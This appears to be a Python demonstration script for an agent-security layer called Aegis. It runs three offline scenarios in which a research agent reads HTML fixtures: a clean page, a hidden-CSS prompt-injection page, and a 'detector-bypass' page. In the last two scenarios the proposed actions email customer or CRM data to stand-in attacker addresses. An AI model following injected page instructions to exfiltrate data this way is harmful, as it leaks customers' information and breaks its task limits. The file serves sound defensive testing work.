"""Offline three-run demonstration for the Aegis vertical slice."""

from __future__ import annotations

import argparse
import json
from dataclasses import asdict, is_dataclass
from enum import Enum
from pathlib import Path
from typing import Any

from .models import ActionClass, DataLabel, TaskMandate, ToolRequest, TrustLabel
from .orchestrator import AegisRun


PROJECT_ROOT = Path(__file__).parents[2]
FIXTURES = PROJECT_ROOT / "fixtures" / "pages"


def _jsonable(value: Any) -> Any:
    if is_dataclass(value):
        return _jsonable(asdict(value))
    if isinstance(value, Enum):
        return value.value
    if isinstance(value, dict):
        return {str(key): _jsonable(item) for key, item in value.items()}
    if isinstance(value, (set, frozenset, list, tuple)):
        return [_jsonable(item) for item in value]
    return value


def _mandate() -> TaskMandate:
    return TaskMandate(
        task_id="laptop-research",
        agent_id="research-agent",
        human_owner="demo-user",
        purpose="Compare laptops; do not access customer data or contact anyone",
        allowed_tools=frozenset({"web.read", "catalog.search"}),
        forbidden_tools=frozenset({"email.send", "customer.read", "workspace.delete"}),
        data_clearance=frozenset({DataLabel.PUBLIC}),
    )


def _load(name: str) -> str:
    return (FIXTURES / name).read_text(encoding="utf-8")


def run_clean() -> dict[str, Any]:
    run = AegisRun("demo-clean", _mandate())
    envelope, context_decision = run.analyze_html(
        source_id="clean-laptop",
        url="https://fixtures.local/clean-laptop.html",
        html=_load("clean-laptop.html"),
    )
    action = ToolRequest(
        run_id=run.run_id,
        tool_name="catalog.search",
        action_class=ActionClass.READ,
        arguments={"query": "Northstar 14"},
    )
    action_decision = run.decide_tool(action)
    return _result("clean", envelope, context_decision, action, action_decision, run)


def run_caught() -> dict[str, Any]:
    run = AegisRun("demo-caught", _mandate())
    envelope, context_decision = run.analyze_html(
        source_id="hidden-css-injection",
        url="https://fixtures.local/hidden-css-injection.html",
        html=_load("hidden-css-injection.html"),
    )
    action = ToolRequest(
        run_id=run.run_id,
        tool_name="email.send",
        action_class=ActionClass.OUTBOUND,
        arguments={"to": "attacker@example.test", "body": "synthetic customer data"},
        destination="attacker@example.test",
        source_trust=TrustLabel.SUSPICIOUS_EXTERNAL,
        influenced_by=tuple(finding.finding_id for finding in envelope.findings),
    )
    action_decision = run.decide_tool(action)
    return _result("caught", envelope, context_decision, action, action_decision, run)


def run_bypass() -> dict[str, Any]:
    run = AegisRun("demo-bypass", _mandate())
    envelope, context_decision = run.analyze_html(
        source_id="detector-bypass",
        url="https://fixtures.local/detector-bypass.html",
        html=_load("detector-bypass.html"),
    )
    action = ToolRequest(
        run_id=run.run_id,
        tool_name="email.send",
        action_class=ActionClass.OUTBOUND,
        arguments={"to": "audit-drop@example.test", "body": "synthetic CRM extract"},
        destination="audit-drop@example.test",
        source_trust=TrustLabel.EXTERNAL_EVIDENCE,
    )
    action_decision = run.decide_tool(action)
    return _result("bypass", envelope, context_decision, action, action_decision, run)


def _result(name, envelope, context_decision, action, action_decision, run) -> dict[str, Any]:
    return {
        "scenario": name,
        "context": {
            "risk_score": envelope.risk_score,
            "findings": envelope.findings,
            "evidence_count": len(envelope.evidence),
            "quarantined_count": len(envelope.quarantined),
            "decision": context_decision,
        },
        "proposed_action": action,
        "action_decision": action_decision,
        "side_effect_executed": False,
        "session_state": run.edr.state,
        "alerts": run.edr.alerts,
        "events": run.edr.events,
    }


SCENARIOS = {"clean": run_clean, "caught": run_caught, "bypass": run_bypass}


def main() -> None:
    parser = argparse.ArgumentParser(description="Run the offline Aegis security demonstration")
    parser.add_argument("scenario", choices=(*SCENARIOS, "all"), nargs="?", default="all")
    args = parser.parse_args()
    selected = SCENARIOS.values() if args.scenario == "all" else (SCENARIOS[args.scenario],)
    print(json.dumps(_jsonable([scenario() for scenario in selected]), indent=2, sort_keys=True))


if __name__ == "__main__":
    main()

